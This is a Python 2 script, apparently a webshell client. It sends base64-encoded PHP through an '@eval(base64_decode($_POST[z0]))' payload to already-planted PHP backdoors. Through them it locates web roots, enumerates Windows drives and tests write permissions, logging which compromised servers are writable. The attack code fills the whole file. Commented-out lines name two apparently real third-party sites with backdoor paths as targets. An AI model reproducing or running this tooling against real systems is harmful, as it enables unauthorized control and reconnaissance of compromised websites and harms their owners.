#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
import threading
import httplib
import re
import php_data
import g
import sys
import base64
import eval
#import list
import httplib,StringIO,gzip,urllib,re
import binascii
import chardet
import ConfigParser  #读取INI配置信息
import random   #打乱数组排序
import os
#import sc_html  #生成HTML
import urllib2
import time
import Queue
#import sitemap_xml   #生成站点地图
#import shell_links  #SHELLSEO
import thread
sys.path.append('..')
reload(sys)
sys.setdefaultencoding("utf-8")

class php_shell(threading.Thread):
    def __init__(self, url, password,i):
        threading.Thread.__init__(self)
        self.url = url  #URL
        #self.web_path = ""  #webshell主目录
        self.password = password  #password
        self.TH=i  #线程号
        self.list_path=[]   #目录
        self.open_pb_txt()   #

    def open_pb_txt(self):   #读取要屏蔽的内容
        try:
            try:
                xxx = file("file_path.txt", 'r')
                for xxx_line in xxx.readlines():
                    self.list_path.append(xxx_line.strip().lstrip())  #添加数据+"\r\n"
            except Exception, e:
                print u"读取文件 file_path.txt 异常"
                pass
        except Exception, e:
            pass

    def run(self):
        try:
            web_path = self.www_web_path2()  #获取网站根目录
            str_data = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            data="thread:%d %s|%s"%(self.TH,str(self.url),str(self.password))
            if not web_path[0:1] in str_data:
                self.TXT_file_add("no_win.txt",str(data))
                return 0
            print u"thread:%d %s"%(self.TH,str(self.url))
            win_def = self.www_web_win_def()  #获取网站根目录
            ss = win_def.split(":")
            name="|"
            for i2 in ss:
            #for index, i2 in enumerate(ss):
                if not len(i2) == 1:
                    continue  #跳过   这一次
                data2=self.PHP_ml_list(i2+":\\")
                ss = data2.split("\t")
                if len(ss)>=3:
                    if self.php_qx_path(i2+":\\text.txt"):  #测试目录权限
                        print "thread:%d ok %s:\\  %s"%(self.TH,i2,data)
                        name+=i2+":\\ ok|"
            if len(name)>=3:
                self.TXT_file_add("cdef_ok_win.txt",str(data+name))
            list_path="|"
            for i2 in self.list_path:
                data2=self.PHP_ml_list(i2+":\\")
                ss = data2.split("\t")
                if len(ss)>=1:
                    if self.php_qx_path(i2+"text.txt"):  #测试目录权限
                        print "thread:%d ok %s  %s"%(self.TH,i2,data)
                        list_path+=i2+" ok|"
            if len(list_path)>=3:
                self.TXT_file_add("list_path_ok_win.txt",str(data+list_path))
        except Exception, e:
            #print e
            return 0

    def PHP_ml_list(self,path):  #测试目录文件数量
        try:
            PHP_data = str(php_data.PHP_ml_list)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s&z1=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path))  #quote URL编码
            #print params
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def php_qx_path(self,path):  #测试目录权限
        try:
            PHP_data = str(php_data.PHP_qx_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s&z1=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def TXT_file_add(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def www_web_win_def(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.php_win_def)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def www_web_path2(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.php_www_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0


if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(php_shell("http://localhost/long.php","long123",1))
        #threads.append(php_ecal("http://www.wulinzr.com/plus/mytag_js.php?aid=6022","1",1))
        #threads.append(php_ecal("http://rqllgs.com/plus/mytag_js.php?aid=6022","1",1))
    for t in threads:
        t.start()


